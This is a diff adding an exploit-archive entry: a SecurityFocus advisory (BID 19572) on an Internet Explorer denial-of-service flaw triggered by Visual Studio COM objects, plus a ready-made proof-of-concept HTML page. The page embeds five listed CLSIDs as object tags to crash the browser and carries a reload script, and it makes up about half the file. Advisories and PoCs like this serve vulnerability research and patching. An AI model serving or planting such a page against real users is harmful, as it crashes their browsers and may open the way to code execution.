@@ -1,0 +1,46 @@
+source: http://www.securityfocus.com/bid/19572/info
+
+Microsoft Internet Explorer is prone to a denial-of-service vulnerability that occurs when instantiating Visual Studio COM objects. 
+
+The vulnerability arises because of the way Internet Explorer tries to instantiate certain COM objects as ActiveX controls, resulting in denial-of-service conditions. Remote code execution may be possible, but this has not been confirmed.
+
+This BID may be related to the issues described in BID 14511 (Microsoft Internet Explorer COM Object Instantiation Buffer Overflow Vulnerability) and BID 15061 Microsoft Internet Explorer COM Object Instantiation Variant Vulnerability). Note, however, that this issue affects a different set of COM objects that were not addressed in the previous BIDs.
+
+<!--
+// Visual Studio 6.0 Multiple COM Object Instantiation Vulnerability
+// tested on Windows 2000/2003
+
+// http://www.xsec.org
+// nop (nop#xsec.org)
+
+// CLSID: {9AF971C5-8E7A-11D0-A2BB-00C04FC33E92}
+// Info: FpFile Class// ProgID: WECAPI.FpFile.1
+// InprocServer32: C:\WINDOWS\System\FP30WEC.DLL
+
+// CLSID: {AB39F080-0F5D-11D1-8E2F-00C04FB68D60}
+// Info: TCExtPage Class
+// InprocServer32: C:\PROGRA~1\MICROS~1\Common\Tools\TCPROPS.DLL
+
+// CLSID: {CCDBBDA1-FA19-11D0-9B51-00A0C91E29D8}
+// Info: FpaFile Class// ProgID: FpaFile.FpaFile.1
+// InprocServer32: C:\WINDOWS\system\VI30AUT.DLL
+
+// CLSID: {E9B0E6CB-811C-11D0-AD51-00A0C90F5739}
+// Info: Microsoft Data Tools Query Designer// ProgID: MSDTQueryDesigner2
+// InprocServer32: C:\Program Files\Common Files\Microsoft Shared\MSDesigners98\mdt2qd.dll
+
+// CLSID: {E9B0E6D4-811C-11D0-AD51-00A0C90F5739}
+// Info: Microsoft Data Tools Database Designer// ProgID: MSDTDatabaseDesigner2
+// InprocServer32: C:\Program Files\Common Files\Microsoft Shared\MSDesigners98\mdt2db.dll
+--!>
+
+<html><body>
+<object classid="CLSID:{9AF971C5-8E7A-11D0-A2BB-00C04FC33E92}"> </object>
+<object classid="CLSID:{AB39F080-0F5D-11D1-8E2F-00C04FB68D60}"> </object>
+<object classid="CLSID:{CCDBBDA1-FA19-11D0-9B51-00A0C91E29D8}"> </object>
+<object classid="CLSID:{E9B0E6CB-811C-11D0-AD51-00A0C90F5739}"> </object>
+<object classid="CLSID:{E9B0E6D4-811C-11D0-AD51-00A0C90F5739}"> </object>
+<!--
+</body>
+<script>location.reload();</script>
+</html>
